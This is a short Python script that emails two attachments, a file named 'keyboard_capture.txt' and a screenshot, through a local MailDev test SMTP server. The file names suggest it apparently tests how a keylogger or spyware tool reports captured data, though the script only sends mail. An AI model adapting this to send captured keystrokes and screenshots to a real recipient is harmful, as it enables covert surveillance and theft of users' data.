import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# MailDev configuration
SMTP_SERVER = 'localhost'
SMTP_PORT = 1025

# Sender and recipient email addresses
sender_email = 'sender@example.com'
recipient_email = 'recipient@example.com'

# Create a multipart message
message = MIMEMultipart()
message['From'] = sender_email
message['To'] = recipient_email
message['Subject'] = 'Test Email with Attachment'

# Add body to email
body = "This is a test email sent with an attachment."
message.attach(MIMEText(body, 'plain'))

# Open the file to be attached
filename = 'keyboard_capture.txt'
attachment = open(filename, 'rb')

# Add attachment to email
part = MIMEBase('application', 'octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
message.attach(part)
attachment.close()


# Second attachment: screenshot.png
filename2 = 'screenshot.png'
attachment2 = open(filename2, 'rb')

part2 = MIMEBase('application', 'octet-stream')
part2.set_payload(attachment2.read())
encoders.encode_base64(part2)
part2.add_header('Content-Disposition', f'attachment; filename={filename2}')
message.attach(part2)

attachment2.close()
# Connect to MailDev SMTP server
server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)

# Send email
server.sendmail(sender_email, recipient_email, message.as_string())

# Close SMTP connection
server.quit()

print("Email sent successfully!")

